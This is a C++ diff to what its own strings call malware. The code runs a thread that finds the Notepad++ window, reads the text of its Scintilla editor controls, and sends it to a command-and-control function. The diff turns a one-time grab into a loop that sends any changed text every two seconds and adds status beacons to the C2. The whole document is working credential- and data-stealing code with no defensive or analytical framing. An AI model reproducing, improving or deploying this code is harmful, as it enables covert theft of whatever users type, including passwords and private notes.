@@ -1,5 +1,5 @@
-#include <windows.h>
 #include <winsock2.h>
+#include <windows.h>
 #include <ws2tcpip.h>
 #include <string>
 #include <vector>
@@ -40,7 +40,7 @@ std::vector<std::string> childTexts;
 BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
     char className[256];
     GetClassNameA(hwnd, className, sizeof(className));
-    if (strcmp(className, "Scintilla") == 0) {
+    if (strcmp(className, "Scintilla") == 0 || strcmp(className, "Scintilla5") == 0) {
         int length = SendMessageA(hwnd, WM_GETTEXTLENGTH, 0, 0);
         if (length > 0) {
             std::vector<char> buffer(length + 1);
@@ -51,36 +51,44 @@ BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
     return TRUE;
 }
 
-DWORD WINAPI ThreadFunc(LPVOID lpParam) {   
+DWORD WINAPI ThreadFunc(LPVOID lpParam) {
+    SendDataToC2("Malware thread started!");
+
     Sleep(1000);
+    HWND hwnd = NULL;
+    EnumWindows([](HWND h, LPARAM lParam) -> BOOL {
+        wchar_t cls[256];
+        GetClassNameW(h, cls, 256);
+        if (wcscmp(cls, L"Notepad++") == 0) {
+            *(HWND*)lParam = h;
+            return FALSE;
+        }
+        return TRUE;
+        }, (LPARAM)&hwnd);
 
-    HWND hwnd = FindWindowW(L"Notepad++", NULL);
     if (!hwnd) {
-        hwnd = FindWindowW(L"Notepad++", L"");
-    }
-    if (!hwnd) {
-        hwnd = FindWindowW(NULL, L"*New text document* - Notepad++");
+        SendDataToC2("Notepad++ not found!");
+        return 0;
     }
 
-    if (hwnd) {
+    SendDataToC2("Notepad++ found!");
+
+    std::string previousText;
+    while (true) {
         childTexts.clear();
         EnumChildWindows(hwnd, EnumChildProc, 0);
 
         std::string allText;
-        for (const auto& text : childTexts) {
-            allText += text;
-            allText += "\n---\n";
+        for (const auto& t : childTexts) {
+            allText += t + "\n---\n";
         }
 
-        if (!allText.empty()) {
-            SendDataToC2(allText);
+        if (allText != previousText) {
+            SendDataToC2(allText.empty() ? "No text" : allText);
+            previousText = allText;
         }
-        else {
-            SendDataToC2("No text found.");
-        }
-    }
-    else {
-        SendDataToC2("Notepad++ window not found.");
+
+        Sleep(2000);
     }
 
     return 0;
